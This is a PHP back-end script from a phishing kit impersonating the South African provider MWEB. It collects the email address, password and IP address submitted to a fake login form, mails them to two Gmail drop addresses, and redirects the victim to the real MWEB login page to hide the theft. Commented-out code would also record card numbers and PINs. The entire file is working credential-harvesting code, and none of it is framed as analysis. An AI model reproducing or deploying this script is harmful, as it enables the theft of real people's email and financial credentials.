<?php
//print_r($_POST);
//die;

$ip = $_SERVER['REMOTE_ADDR'];


$email = $_POST['userIdentifier'];
$emailpwd = $_POST['password'];

$time = time();
$date = date("Y-m-d H:i:s");

/*
require "fllat-master/fllat.php";
$pie = new Fllat("pie");
*/
//print_r($pie); die;

        $msg = '<html>
                    <head></head>
                    <body>
                        <table style="">
                            <tr>
                                <td style="font-weight: bold">Email ADdress:</td>
                                <td style="padding-left: 1em;">'.$email.'</td>
                            </tr>
                            
                            <tr>
                                <td style="font-weight: bold">Email Password:</td>
                                <td style="padding-left: 1em;">'.$emailpwd.'</td>
                            </tr>
                            
                            <tr>
                                <td style="font-weight: bold">IP Address:</td>
                                <td style="padding-left: 1em;">'.$ip.'</td>
                            </tr>
                            
                        </table>
                    </body>
                </html>';
        
        $from = "noreply <noreply@r6-london.webserversystems.com>";
	$headers = "From:" . $from. "\r\n";
        $headers .= "MIME-Version: 1.0" . "\r\n";
        $headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
        $subject = "**MWEB IDENTIFIER- $otpCount** -  ".$time;

        if(mail("inboxmeyourdrop@gmail.com,preciousdestinyontheway@gmail.com","**MWEB IDENTIFIER**",$msg,$headers))
        //if(1)
        {            
            /*
            $newRow = array("cardNumber" => $ccn, "time" => "$time", "isRead" => "0", "isExperience" => "0", "subject"=>$subject, 
                "rowValues" => array(
                    "One Time Pin" => "$otp", 
                    "Card Number" => "$ccn", 
                    "Customer Selected Pin" => "$csp", 
                    "Password" => "$pwd", 
                    "IP Address"=>$ip, 
                    "time" => "$time"
                ));
            $pie->add($newRow);
            */
            
            header("Location: https://myaccount.mweb.co.za/mwebcore/portal/email/login.jsp");
        }else{
            
            echo "not available.......";
        }